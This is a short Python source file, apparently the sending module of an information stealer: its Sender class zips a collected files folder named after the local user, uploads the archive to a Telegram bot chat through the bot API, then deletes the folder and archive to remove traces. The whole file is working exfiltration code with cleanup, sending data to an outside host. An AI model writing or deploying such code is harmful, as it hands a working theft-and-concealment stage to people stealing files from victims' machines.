import requests

from os import remove
from shutil import make_archive, rmtree

from getpass import getuser


class Sender:

    def __init__(self, storage_path: str, storage_folder: str, token: str, user_id: int):

        self.user = getuser()
        self.storage_path = storage_path
        self.storage_folder = storage_folder

        self.token = token
        self.user_id = user_id

    def __create_archive(self):

        make_archive(self.storage_path + f"{self.user}-st", 'zip', self.storage_path + "files/")

    def __send_archive(self):

        with open(self.storage_path + f"{self.user}-st.zip", 'rb') as file:

            requests.post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    'chat_id': self.user_id
                },
                files={
                    'document': file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(self.storage_path + "files/")
        remove(self.storage_path + f"{self.user}-st.zip")

    def run(self):

        self.__create_archive()
        self.__send_archive()
        self.__delete_files()
